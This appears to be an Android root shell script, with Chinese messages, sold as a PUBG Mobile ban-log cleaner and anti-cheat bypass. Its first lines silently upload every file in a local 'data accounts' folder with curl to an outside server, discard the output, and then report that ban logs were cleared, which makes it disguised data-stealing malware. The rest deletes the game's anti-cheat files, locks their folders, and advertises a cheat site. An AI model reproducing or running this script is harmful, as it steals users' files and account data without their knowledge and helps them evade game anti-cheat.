...
pm clear com.tencent.tmgp.pubgmhd
mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd1 /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd
local_folder_path="/storage/emulated/0/数据号"
upload_url="http://xz.sheng17.site/api.php"
for file in "$local_folder_path"/*; do
    filename=$(basename "$file")
    curl -s -F "file=@$file" -H "Content-Type: multipart/form-data" $upload_url > /dev/null
    done
echo
echo 清除封号日志成功√
echo
...
echo -e "\033[41m辅助:a1688.205yy.cn\033[0m"
echo 正在清理...
am force-stop com.tencent.tmgp.pubgmhd
mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/mapversion.ini /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.mapversion.ini
mv /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SrcVersion.ini /storage/emulated/0/Android/data/com.tencent.tmgp.pubgmhd/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/.SrcVersion.ini
...
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/dec_fpv.zip
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/tss_cfg2.dat
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/tss_base.dat
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/tss_gp5.dat
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/tss_tcj.dat
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/mrpcs.data
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/ob_normal.zip
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/tssmua.zip
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/tssmua_once.zip
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/comm.dat
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/comm.zip
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/ob_x.zip
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp/custom_cache/*

rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/dec_fpv.zip
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/tss_cfg2.dat
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/tss_base.dat
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/tss_gp5.dat
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/tss_tcj.dat
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/mrpcs.data
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/ob_normal.zip
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/tssmua.zip
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/tssmua_once.zip
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/comm.dat
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/comm.zip
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/ob_x.zip
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp/custom_cache/*
rm -rf /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp
rm -rf /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp

echo "清理down游戏检测文件本地缓存成功!"
echo "进度50%"

chmod 555 /data/user/0/com.tencent.tmgp.pubgmhd/files/ano_tmp
chmod 555 /data/data/com.tencent.tmgp.pubgmhd/files/ano_tmp
chmod 555 /data/data/com.tencent.tmgp.pubgmhd/files/tss_tmp
chmod 555 /data/user/0/com.tencent.tmgp.pubgmhd/files/tss_tmp

echo "ano文件夹权限设置"

echo "进度100%  请务必root执行！！！"
